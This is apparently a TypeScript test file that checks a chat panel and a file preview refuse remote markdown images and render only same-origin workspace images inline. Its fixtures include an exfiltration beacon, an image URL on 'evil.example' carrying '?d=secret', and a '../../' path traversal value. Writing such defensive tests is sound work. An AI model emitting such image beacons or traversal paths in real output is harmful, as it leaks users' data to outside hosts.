import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { ChatMessageCard, sameOriginImage } from "@abstractframework/panel-chat";
import { safeMarkdownImages } from "./session_files";

// The Files preview (safeMarkdownImages) and panel-chat's assistant-message
// rule (sameOriginImage, images="link") must agree: the workspace content
// route stays relative to the page's base (the app may be served under the
// gateway's /apps/code/), which panel-chat resolves on this page's origin and
// shows inline; images on another host are links in both.
describe("image policy: Files preview and chat agree", () => {
  beforeAll(() => {
    vi.stubGlobal("document", { baseURI: "http://code.test/apps/code/" });
  });
  afterAll(() => vi.unstubAllGlobals());
  const md = [
    "![plot](figs/plot.png)",
    "![beacon](https://evil.example/t.gif?d=secret)",
    "![pix](//evil.example/p.png)",
    "![up](../../escape.png)",
  ].join("\n");
  const safe = () => safeMarkdownImages(md, "r1", "docs/README.md");
  const workspaceUrl = "api/gateway/runs/r1/workspace/content?path=docs%2Ffigs%2Fplot.png";
  const asLink = (src: string) => new RegExp(`(^|[^!])\\[image: [^\\]]*\\]\\(${src.replace(/[.*+?^${}()|[\]\\/]/g, "\\$&")}\\)`, "m");

  it("the workspace content route is inline for panel-chat too", () => {
    expect(safe()).toContain(`![plot](${workspaceUrl})`);
    expect(sameOriginImage(workspaceUrl)).toBe(true);
  });

  it("every image on another host is a link in the preview and refused by panel-chat", () => {
    for (const src of ["https://evil.example/t.gif?d=secret", "//evil.example/p.png"]) {
      expect(safe()).toMatch(asLink(src));
      expect(sameOriginImage(src)).toBe(false);
    }
  });

  it("the preview never resolves a path above the workspace root (a link, never a workspace read)", () => {
    expect(safe()).toMatch(asLink("../../escape.png"));
  });

  it("an assistant message shows the workspace image inline and a remote one as a link", () => {
    const html = renderToStaticMarkup(
      <ChatMessageCard
        message={{
          id: "a1",
          role: "assistant",
          content: `![plot](${workspaceUrl})\n\n![beacon](https://evil.example/t.gif)`,
        }}
      />,
    );
    expect(html).toContain(`src="${workspaceUrl}"`);
    expect(html).not.toMatch(/<img[^>]+evil\.example/);
    expect(html).toContain("image: beacon");
  });
});
